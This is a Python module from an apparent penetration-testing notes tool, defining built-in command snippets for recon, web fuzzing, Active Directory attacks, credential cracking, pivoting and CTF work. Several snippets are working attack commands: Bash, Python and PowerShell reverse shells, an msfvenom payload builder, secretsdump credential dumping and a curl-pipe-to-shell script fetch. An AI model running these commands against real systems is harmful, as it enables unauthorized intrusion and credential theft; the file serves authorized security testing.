"""Built-in command snippets and placeholder resolution for authorized testing."""

from __future__ import annotations

from collections.abc import Mapping

from redscribe.content.placeholders import interpolate, placeholder_names, target_values
from redscribe.domain.models import Snippet
from redscribe.domain.utils import slugify


def _snippet(title: str, command: str, description: str, tags: str) -> Snippet:
    return Snippet(
        title=title,
        command=command,
        description=description,
        tags=tags,
        builtin=True,
        builtin_key=slugify(title),
    )


BUILTIN_SNIPPETS: tuple[Snippet, ...] = (
    _snippet(
        "Nmap quick scan",
        "nmap -sC -sV -oA nmap/quick {{target}}",
        "Default scripts, version detection, and three output formats.",
        "recon,nmap",
    ),
    _snippet(
        "Nmap full TCP",
        "nmap -p- --min-rate 2000 -T4 -oA nmap/full {{target}}",
        "Full TCP port sweep followed by targeted service scans.",
        "recon,nmap",
    ),
    _snippet(
        "Nmap UDP top ports",
        "sudo nmap -sU --top-ports 100 -oA nmap/udp {{target}}",
        "Fast UDP survey of the most common services.",
        "recon,nmap",
    ),
    _snippet(
        "RustScan",
        "rustscan -a {{target}} -- -sC -sV",
        "Fast port discovery that hands open ports to Nmap.",
        "recon,ports",
    ),
    _snippet(
        "Masscan",
        "sudo masscan -p1-65535 --rate 2000 {{target}}",
        "High-speed TCP port scan for large scopes.",
        "recon,ports",
    ),
    _snippet(
        "Ping sweep",
        "nmap -sn {{target}}/24",
        "Discover live hosts in a /24 without port scanning.",
        "recon,hosts",
    ),
    _snippet(
        "Reverse DNS",
        "dig -x {{target}} +short",
        "Look up the PTR record for an address.",
        "recon,dns",
    ),
    _snippet(
        "WHOIS",
        "whois {{target}}",
        "Registration and ownership data.",
        "recon,osint",
    ),
    _snippet(
        "TLS certificate",
        "openssl s_client -connect {{target}}:443 -servername {{domain}} </dev/null 2>/dev/null "
        "| openssl x509 -noout -text",
        "Inspect the certificate chain, names, and validity.",
        "recon,tls",
    ),
    _snippet(
        "HTTP headers",
        "curl -sSIL {{url}}",
        "Follow redirects and print response headers.",
        "recon,web,http",
    ),
    _snippet(
        "Subfinder",
        "subfinder -d {{domain}} -all -silent | tee subs.txt",
        "Passive subdomain enumeration.",
        "dns,recon",
    ),
    _snippet(
        "Amass passive",
        "amass enum -passive -d {{domain}} -o amass.txt",
        "Passive asset discovery with Amass.",
        "dns,recon",
    ),
    _snippet(
        "dnsx resolve",
        "dnsx -l subs.txt -a -resp -silent",
        "Resolve a list of discovered hostnames.",
        "dns,recon",
    ),
    _snippet(
        "DNS zone transfer",
        "dig AXFR {{domain}} @{{target}}",
        "Attempt a zone transfer against an authoritative server.",
        "dns,recon",
    ),
    _snippet(
        "dnsrecon",
        "dnsrecon -d {{domain}} -t std",
        "Standard DNS enumeration and record discovery.",
        "dns,recon",
    ),
    _snippet(
        "ffuf directories",
        "ffuf -u {{url}}/FUZZ -w /usr/share/wordlists/dirb/common.txt "
        "-mc 200,204,301,302,307,401,403 -ac",
        "Content discovery with automatic calibration.",
        "web,fuzz",
    ),
    _snippet(
        "Feroxbuster",
        "feroxbuster -u {{url}} -w /usr/share/seclists/Discovery/Web-Content/"
        "raft-medium-directories.txt -x php,html,txt -q",
        "Recursive content discovery with common extensions.",
        "web,fuzz",
    ),
    _snippet(
        "Gobuster vhosts",
        "gobuster vhost -u {{url}} -w /usr/share/seclists/Discovery/DNS/"
        "subdomains-top1million-5000.txt --append-domain",
        "Virtual host discovery by Host header.",
        "web,dns",
    ),
    _snippet(
        "Nikto",
        "nikto -h {{url}} -maxtime 120s",
        "Quick web server misconfiguration scan.",
        "web,scanner",
    ),
    _snippet(
        "Nuclei",
        "nuclei -u {{url}} -severity low,medium,high,critical -stats",
        "Template-based vulnerability checks.",
        "web,scanner",
    ),
    _snippet(
        "SQLMap",
        'sqlmap -u "{{url}}?id=1" --batch --risk=3 --level=3 --dbs',
        "Test a parameter for SQL injection and list databases.",
        "web,sqli",
    ),
    _snippet(
        "Arjun parameters",
        "arjun -u {{url}} -m GET,POST",
        "Discover hidden HTTP parameters.",
        "web,params",
    ),
    _snippet(
        "Dalfox XSS",
        'dalfox url "{{url}}?q=test" --skip-bav',
        "Reflected XSS scanning with payload verification.",
        "web,xss",
    ),
    _snippet(
        "LFI fuzz",
        "ffuf -u {{url}}?file=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt "
        "-mc all -fs 0",
        "Probe a parameter for local file inclusion.",
        "web,lfi",
    ),
    _snippet(
        "WPScan",
        "wpscan --url {{url}} --enumerate vp,vt,u",
        "Enumerate WordPress plugins, themes, and users.",
        "web,wordpress",
    ),
    _snippet(
        "Kiterunner API",
        "kr scan {{url}} -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt",
        "Discover API routes with Kiterunner.",
        "web,api",
    ),
    _snippet(
        "NetExec SMB",
        "netexec smb {{target}} -u {{user}} -p {{password}} --shares",
        "Validate SMB credentials and list shares.",
        "ad,smb",
    ),
    _snippet(
        "SMB null session",
        "netexec smb {{target}} -u '' -p '' --shares",
        "Check for anonymous SMB access.",
        "ad,smb",
    ),
    _snippet(
        "NetExec WinRM",
        "netexec winrm {{target}} -u {{user}} -p {{password}}",
        "Test WinRM authentication and command execution.",
        "ad,windows",
    ),
    _snippet(
        "enum4linux-ng",
        "enum4linux-ng -A {{target}}",
        "Enumerate users, groups, shares, and policies over SMB/RPC.",
        "ad,smb",
    ),
    _snippet(
        "smbclient shares",
        "smbclient -L //{{target}}/ -N",
        "List SMB shares with a null session.",
        "ad,smb",
    ),
    _snippet(
        "BloodHound collection",
        "bloodhound-python -u {{user}} -p {{password}} -d {{domain}} -ns {{target}} -c all",
        "Collect Active Directory relationships for BloodHound.",
        "ad,bloodhound",
    ),
    _snippet(
        "Kerbrute user enum",
        "kerbrute userenum -d {{domain}} --dc {{target}} users.txt",
        "Enumerate valid domain usernames over Kerberos.",
        "ad,kerberos",
    ),
    _snippet(
        "AS-REP roast",
        "impacket-GetNPUsers {{domain}}/ -dc-ip {{target}} -usersfile users.txt "
        "-format hashcat -outputfile asrep.txt",
        "Collect crackable AS-REP hashes for accounts without pre-auth.",
        "ad,kerberos,creds",
    ),
    _snippet(
        "SecretsDump",
        "impacket-secretsdump {{domain}}/{{user}}:{{password}}@{{target}}",
        "Dump SAM, LSA secrets, and cached credentials with valid admin access.",
        "ad,creds",
    ),
    _snippet(
        "PsExec",
        "impacket-psexec {{domain}}/{{user}}:{{password}}@{{target}}",
        "Obtain a SYSTEM shell over SMB with admin credentials.",
        "ad,shell",
    ),
    _snippet(
        "LDAP search",
        "ldapsearch -x -H ldap://{{target}} -D '{{user}}@{{domain}}' -w '{{password}}' "
        "-b 'DC=example,DC=local'",
        "Query LDAP with valid domain credentials.",
        "ad,ldap",
    ),
    _snippet(
        "Hydra SSH",
        "hydra -L users.txt -P passwords.txt ssh://{{target}} -t 4 -f",
        "Password spraying or brute force against SSH (authorized targets only).",
        "creds,ssh",
    ),
    _snippet(
        "Hydra HTTP POST",
        "hydra -L users.txt -P passwords.txt {{target}} http-post-form "
        '"/login:username=^USER^&password=^PASS^:F=Invalid credentials"',
        "Credential testing against a login form with a failure string.",
        "creds,web",
    ),
    _snippet(
        "Hashcat",
        "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
        "Crack MD5 hashes; change -m for other algorithms.",
        "creds,hashcat",
    ),
    _snippet(
        "John the Ripper",
        "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
        "Wordlist attack with automatic hash detection.",
        "creds,john",
    ),
    _snippet(
        "Bash reverse shell",
        "bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1",
        "Simple Bash TCP reverse shell.",
        "shell,payload",
    ),
    _snippet(
        "Netcat listener",
        "nc -lvnp {{lport}}",
        "Catch a reverse shell on a local port.",
        "shell,listener",
    ),
    _snippet(
        "Python reverse shell",
        "python3 -c 'import socket,subprocess,os;"
        's=socket.socket();s.connect(("{{lhost}}",{{lport}}));'
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        'subprocess.call(["/bin/sh","-i"])\'',
        "Python 3 reverse shell for Linux targets.",
        "shell,payload",
    ),
    _snippet(
        "PowerShell reverse shell",
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        "\"$c=New-Object Net.Sockets.TCPClient('{{lhost}}',{{lport}});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);"
        '$s.Flush()};$c.Close()"',
        "PowerShell reverse shell with an interactive prompt.",
        "shell,payload,windows",
    ),
    _snippet(
        "Upgrade TTY",
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "Then press Ctrl+Z, run stty raw -echo; fg, and export TERM=xterm.",
        "shell,tty",
    ),
    _snippet(
        "Socat shell",
        "socat TCP-LISTEN:{{lport}},reuseaddr,fork EXEC:/bin/bash",
        "Bind a Bash shell with Socat.",
        "shell,listener",
    ),
    _snippet(
        "msfvenom ELF payload",
        "msfvenom -p linux/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f elf -o shell.elf",
        "Build a Linux reverse-shell ELF.",
        "shell,payload",
    ),
    _snippet(
        "sudo -l",
        "sudo -l",
        "List commands the current user may run with sudo.",
        "privesc,linux",
    ),
    _snippet(
        "SUID binaries",
        "find / -perm -4000 -type f 2>/dev/null",
        "Enumerate SUID executables for privilege escalation.",
        "privesc,linux",
    ),
    _snippet(
        "File capabilities",
        "getcap -r / 2>/dev/null",
        "Find binaries with Linux capabilities.",
        "privesc,linux",
    ),
    _snippet(
        "Cron inspection",
        "cat /etc/crontab; ls -la /etc/cron.*; crontab -l",
        "Review scheduled jobs for writable or privileged tasks.",
        "privesc,linux",
    ),
    _snippet(
        "LinPEAS",
        "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        "Run the LinPEAS privilege-escalation audit.",
        "privesc,linux",
    ),
    _snippet(
        "pspy",
        "./pspy64 -pf -i 1000",
        "Watch process execution without root.",
        "privesc,linux",
    ),
    _snippet(
        "Windows privileges",
        "whoami /priv; whoami /groups; systeminfo",
        "Review token privileges, groups, and patch level.",
        "privesc,windows",
    ),
    _snippet(
        "WinPEAS",
        ".\\winPEASx64.exe",
        "Run the WinPEAS privilege-escalation audit.",
        "privesc,windows",
    ),
    _snippet(
        "SSH dynamic proxy",
        "ssh -D 1080 -N -f {{user}}@{{target}}",
        "Start a SOCKS5 proxy through SSH.",
        "pivot,ssh",
    ),
    _snippet(
        "Chisel server",
        "chisel server -p 8000 --reverse",
        "Start a reverse-tunnel Chisel server on the attack host.",
        "pivot,chisel",
    ),
    _snippet(
        "Chisel client",
        "chisel client {{lhost}}:8000 R:socks",
        "Connect a compromised host back to the Chisel server.",
        "pivot,chisel",
    ),
    _snippet(
        "Socat port forward",
        "socat TCP-LISTEN:8080,fork TCP:{{target}}:80",
        "Forward a local port to an internal service.",
        "pivot,socat",
    ),
    _snippet(
        "Strings",
        "strings -n 6 {{file}} | less",
        "Extract printable strings from a binary.",
        "ctf,misc",
    ),
    _snippet(
        "Binwalk",
        "binwalk -e {{file}}",
        "Extract embedded filesystems and archives.",
        "ctf,forensics",
    ),
    _snippet(
        "ExifTool",
        "exiftool {{file}}",
        "Inspect metadata in images and documents.",
        "ctf,forensics",
    ),
    _snippet(
        "Steghide extract",
        "steghide extract -sf {{file}}",
        "Extract data hidden with Steghide.",
        "ctf,stego",
    ),
    _snippet(
        "zsteg",
        "zsteg -a {{file}}",
        "Analyze PNG and BMP steganography.",
        "ctf,stego",
    ),
    _snippet(
        "Base64 decode",
        "echo '{{data}}' | base64 -d",
        "Decode a Base64 string.",
        "ctf,encoding",
    ),
    _snippet(
        "File type",
        "file {{file}}; checksec --file={{file}}",
        "Identify a file and inspect its binary protections.",
        "ctf,pwn",
    ),
    _snippet(
        "RSA key inspection",
        "openssl rsa -in key.pem -text -noout",
        "Print RSA parameters for a CTF crypto challenge.",
        "ctf,crypto",
    ),
    _snippet(
        "Hash identification",
        "hashid '{{hash}}'",
        "Identify a hash type before cracking.",
        "ctf,creds",
    ),
    _snippet(
        "Python HTTP server",
        "python3 -m http.server 8000",
        "Serve files from the current directory.",
        "misc,transfer",
    ),
    _snippet(
        "JWT inspection",
        "jwt_tool {{token}}",
        "Decode and test a JSON Web Token.",
        "web,jwt",
    ),
)

BUILTIN_BY_KEY: dict[str, Snippet] = {snippet.builtin_key: snippet for snippet in BUILTIN_SNIPPETS}


def resolve_command(
    command: str,
    *,
    target: str = "",
    values: Mapping[str, str] | None = None,
) -> str:
    """Replace known placeholders with values from the current note."""
    resolved = dict(values or {})
    context_target = resolved.get("target") or target
    for key, value in target_values(context_target).items():
        resolved.setdefault(key, value)
    return interpolate(command, resolved)


def snippet_placeholders(command: str) -> list[str]:
    """Return the unique placeholders used by a command."""
    return placeholder_names(command)
